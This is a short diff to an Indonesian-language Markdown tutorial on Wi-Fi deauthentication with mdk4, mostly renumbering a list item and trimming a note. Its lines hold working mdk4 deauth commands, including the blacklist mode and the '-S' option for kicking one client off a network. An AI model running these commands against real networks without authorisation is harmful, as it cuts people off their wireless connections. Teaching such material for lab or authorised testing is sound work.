@@ -60,7 +60,7 @@ sudo airodump-ng [interface]
       sudo mdk4 [interface] d -E [essid] -B [bssid] -c [channel]
       ```
 
-   1. Blacklist mode:
+   2. Blacklist mode:
 
       ```
       sudo mdk4 [interface] d -b [file_blacklist] -E [essid] -B [bssid] -c [channel] 
@@ -75,9 +75,8 @@ sudo airodump-ng [interface]
 
       Whitelist mode itu kebalikan dari blacklist mode. Semua client akan di-deauth, kecuali yang ada di file `[file_whitelist].` (dilindungi).
 
-   > **Catatan:**
-   > - Pada blacklist mode, bisa ditambahkan opsi `-w [file_whitelist]` agar client yang ada di file tersebut tidak di-deauth (dilindungi).
-   > - Kalu ingin deauth client tertentu gunakan opsi `-S [mac_client]`.
+   > **Catatan:**  
+   > Kalu ingin deauth client tertentu gunakan opsi `-S [mac_client]`.
 
 ## Video Demonstrasi
 
